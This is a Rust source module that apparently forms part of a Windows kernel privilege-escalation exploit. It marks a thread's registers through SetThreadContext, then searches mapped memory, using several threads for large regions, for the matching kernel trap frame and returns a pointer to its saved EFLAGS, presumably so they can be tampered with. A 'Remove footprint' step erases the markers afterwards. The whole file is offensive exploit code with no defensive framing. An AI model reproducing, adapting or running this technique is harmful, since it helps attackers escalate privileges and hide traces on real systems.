use std::sync::{Arc, atomic::{AtomicPtr, Ordering}};
use std::thread;

use winapi::sched;
use windows::Win32::Foundation::HANDLE;
use windows::Win32::System::Diagnostics::Debug::{GetThreadContext, SetThreadContext};

use super::error::Error as IoplError;
use super::ktrap_frame::TrapFrame;
use super::{types, consts};



macro_rules! offset_of {
    ($type:ty, $field:tt) => ({
        let dummy = ::core::mem::MaybeUninit::<$type>::uninit();
        let dummy_ptr = dummy.as_ptr();

        #[allow(unused_unsafe)]
        let field_ptr = unsafe { std::ptr::addr_of!((*dummy_ptr).$field) };
        
        field_ptr as usize - dummy_ptr as usize
    })
}



#[inline]
unsafe fn is_desired_eflags(possible_eflags: *const u32, thread_state: &types::ThreadState) -> bool {
    let eflags_offset = offset_of!(TrapFrame, eflags);
    let trap_frame = (possible_eflags as usize - eflags_offset) as *const TrapFrame;

    ((*trap_frame).rax == consts::MARK_RAX)
    && ((*trap_frame).rcx == consts::MARK_RCX)
    && ((*trap_frame).rdx == consts::MARK_RDX)
    && ((*trap_frame).r8  == consts::MARK_R8)
    && ((*trap_frame).r9  == consts::MARK_R9)
    && ((*trap_frame).rip == thread_state.rip())
    && ((*trap_frame).rsp == thread_state.rsp())
    && ((*trap_frame).seg_ss == 0x2b)
}



unsafe fn find_by_single_thread(mapped: &[u32], thread_state: &types::ThreadState) -> *mut u32 {
    for entry in mapped {
        if is_desired_eflags(entry, thread_state) {
            return std::ptr::addr_of!(*entry).cast_mut();
        }
    }

    std::ptr::null_mut()
}



unsafe fn find_by_multiple_threads(mapped: &[u32], thread_state: &types::ThreadState) -> *mut u32 {
    let cpu_count = sched::get_cpu_count();
    let chunk_size = mapped.len() / cpu_count;
    let chunks: Vec<(usize, &[u32])> = mapped.chunks(chunk_size).enumerate().collect();

    let found = Arc::new(AtomicPtr::new(std::ptr::null_mut()));

    thread::scope(|scope| {
        let mut threads = vec![];

        for chunk in &chunks {
            threads.push(scope.spawn(|| {
                let prev_affinity = sched::set_affinity(sched::Affinity::Exact(chunk.0));

                let mut counter = 0;

                for entry in chunk.1 {
                    if is_desired_eflags(entry, thread_state) {
                        found.store(std::ptr::addr_of!(*entry).cast_mut(), Ordering::Relaxed);
                        break;
                    }

                    // Check that someone has already found the eflags:
                    counter += 1;
                    if counter == (1_048_576 * 1024 / 4) {
                        if !found.load(Ordering::Relaxed).is_null() {
                            break;
                        }

                        counter = 0;
                    }
                }

                let _affinity = sched::set_affinity(prev_affinity);
            }));
        }

        for thread in threads {
            thread.join().unwrap();
        }
    });

    found.load(Ordering::Relaxed).cast()
}



pub(crate) unsafe fn find_eflags(mapped: &[u32], thread_state: &types::ThreadState) -> *mut u32 {
    const MEGABYTE: usize = 1_048_576;
    const MULTITHREADING_SIZE_THRESHOLD: usize = 256 * MEGABYTE;

    const FIRST_INDEX: usize = if (std::mem::size_of::<types::AlignedContext>() % std::mem::size_of::<u32>()) == 0 {
        std::mem::size_of::<types::AlignedContext>() / std::mem::size_of::<u32>()
    } else {
        std::mem::size_of::<types::AlignedContext>() / std::mem::size_of::<u32>() + 1
    };

    let search_slice = &mapped[FIRST_INDEX..];

    if mapped.len() >= MULTITHREADING_SIZE_THRESHOLD {
        find_by_multiple_threads(search_slice, thread_state)
    } else {
        find_by_single_thread(search_slice, thread_state)
    }
}



pub(crate) unsafe fn convert_slice_to_u32(slice: &[u8]) -> &[u32] {
    std::slice::from_raw_parts(slice.as_ptr().cast(), slice.len() / std::mem::size_of::<u32>())
}



pub(crate) unsafe fn prepare_context(thread_handle: HANDLE) -> Result<types::ContextKeeper, IoplError> {
    let mut original_context = types::AlignedContext::default();
    original_context.ContextFlags = consts::CONTEXT_ALL;
    GetThreadContext(thread_handle, &mut *original_context).ok().map_err(IoplError::GetContext)?;
    
    let mut marked_context = original_context;
    marked_context.Rax = consts::MARK_RAX;
    marked_context.Rcx = consts::MARK_RCX;
    marked_context.Rdx = consts::MARK_RDX;
    marked_context.R8 = consts::MARK_R8;
    marked_context.R9 = consts::MARK_R9;
    
    SetThreadContext(thread_handle, &*marked_context).ok().map_err(IoplError::SetContext)?;
    let context_keeper = types::ContextKeeper::new(thread_handle, &original_context);

    GetThreadContext(thread_handle, &mut *original_context).ok().map_err(IoplError::GetContext)?;

    // Remove footprint:
    std::ptr::write_volatile(&mut marked_context.EFlags, 0);
    std::ptr::write_volatile(&mut marked_context.Rax, 0);
    std::ptr::write_volatile(&mut marked_context.Rcx, 0);
    std::ptr::write_volatile(&mut marked_context.Rdx, 0);
    std::ptr::write_volatile(&mut marked_context.R8, 0);
    std::ptr::write_volatile(&mut marked_context.R9, 0);
    
    Ok(context_keeper)
}